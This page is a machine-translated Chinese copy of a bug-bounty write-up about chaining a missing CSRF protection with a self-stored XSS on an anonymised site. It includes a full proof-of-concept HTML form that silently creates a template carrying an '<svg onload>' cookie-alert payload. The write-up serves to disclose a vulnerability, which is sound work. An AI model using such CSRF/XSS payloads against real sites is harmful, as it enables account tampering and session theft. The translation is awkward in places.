<html>
<head>
<title>CSRF Attack can lead to Stored XSS</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">CSRF的攻击会导致储存XSS</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/csrf-attack-can-lead-to-stored-xss-f40ba91f1e4f?source=collection_archive---------0-----------------------#2019-04-25">https://infosecwriteups.com/csrf-attack-can-lead-to-stored-xss-f40ba91f1e4f?source=collection_archive---------0-----------------------#2019-04-25</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/283a5f0c308c3585e2ab93f05c21f10d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9kWJKsp7luiNnx0U1FIW-Q.jpeg"/></div></div></figure><p id="3f26" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">嘿，伙计们，我又在这里写了一篇关于CSRF和XSS的文章</p><p id="ee90" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">首先，几天前我测试了一个网站，姑且称之为<code class="fe kw kx ky kz b">example.com</code>，我在这个网站上发现了一个包含一些功能的子域，于是我开始测试它，我在一个允许HTML标签的描述字段上发现了一个自存储的XSS，我发现了一个CSRF攻击来添加XSS的有效载荷，但是有一个问题，我应该得到模板ID来编辑它，我不能在我离开的时候暴力破解它 独自一人，现在当我返回测试时，我打开我的打嗝并捕捉请求，我发现一个有趣的请求，我将其发送到<code class="fe kw kx ky kz b">Repeater</code>并再次发送，我发现一个新的模板添加到我的模板列表中，哇，这很好，我扫描了请求，我没有发现任何CSRF保护</p><figure class="la lb lc ld gt jr"><div class="bz fp l di"><div class="le lf l"/></div></figure><p id="bf5f" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">请求中很酷的东西包括模板ID，我可以用它在模板字段上添加一些内容。这次我想起了自存储XSS的旧错误，所以我试图利用这两个错误一起得到存储XSS。我创建了一个HTML文件作为POC。这是代码</p><pre class="la lb lc ld gt lg kz lh li aw lj bi"><span id="1e55" class="lk ll iq kz b gy lm ln l lo lp">&lt;form action="<a class="ae lq" href="https://subdomain.website.com/endpoint" rel="noopener ugc nofollow" target="_blank">https://subdomain.example.com/endpoint</a>" method="POST"&gt;<br/>  &lt;input type="text" name="svcid" value="WRKSPC_LAYER_SERVICE"&gt;&lt;br&gt;<br/>  &lt;input type="text" name="stok" value=""&gt;&lt;br&gt;<br/>  &lt;input type="text" name="v" value="0"&gt;&lt;br&gt;<br/>  &lt;input type="text" name="clientType" value=""&gt;&lt;br&gt;<br/>  &lt;input type="text" name="request" value='{"basePage":{"draftIds":["1514844016810"],"wsId":"-1","wsType":"-1"},"fields":{"title":"CSRF_1","bold":"false"},"fields":{"description":"&lt;font rwr=\"1\" style=\"font-family:Arial\" size=\"4\"&gt;&lt;br&gt;\"&amp;gt;&lt;svg onload=\"alert(cookie)\"&gt;\n&lt;/svg&gt;&lt;/font&gt;","rteMode":"0"},"mode":"INDIVIDUAL","action":"SAVE","layerName":"EDITPANE","variation":null,"currencyInfo":{"currencySymbolLeft":true,"singularName":"U.S. dollars","moneySymbol":"$","decimalSymbol":".","groupingSymbol":",","gS":",","decimalPlaces":"2","currencyCode":"USD","pluralName":"U.S. dollar"},"singleList":true,"listingMode":"AddItem","updateRequired":true,"customFields":{},"byPassUpdate":false,"sellerType":"C2C","saveUlsi":true,"edpCrNew":false,"deletedFields":[],"customAttributes":{"PL_SELLER_ELIGIBLE":"1","PL_FORMAT_ELIGIBLE":"1","PL_CATEGORY_ELIGIBLE":"1","PL_ALREADY_OPTED":"0"},"draftMode":"Listing","restricted":false,"customPreference":{"preferences":{"scheduleStartTime":true,"reservePrice":true,"sellAsLot":true,"privateListing":true,"salesTax":true},"sellerDetails":["BUSINESS_POLICY","NO_STORE_SUBSCRIPTION","NO_SHIPPING_DISCOUNTS","NON_SM_SELLER"]},"payments20":false,"templateId":5553489011,"isvShown":false}'&gt;&lt;br&gt;<br/>  &lt;input type="submit" value="send"&gt;<br/>&lt;/form&gt;</span></pre><p id="34b7" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">这段代码将发送一个编辑id为<code class="fe kw kx ky kz b">1514844016810</code>的模板的请求，所以服务器不会找到具有该id的模板，所以他将创建它并添加新值，该值是添加到描述中的XSS有效载荷，当受害者访问他的模板列表时，他将找到一个新的，所以他将打开它，然后XSS有效载荷将被执行，我是:</p><figure class="la lb lc ld gt jr"><div class="bz fp l di"><div class="lr lf l"/></div></figure><p id="e1de" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我希望你们喜欢它，伙计们，再见，再见。</p></div></div>    
</body>
</html>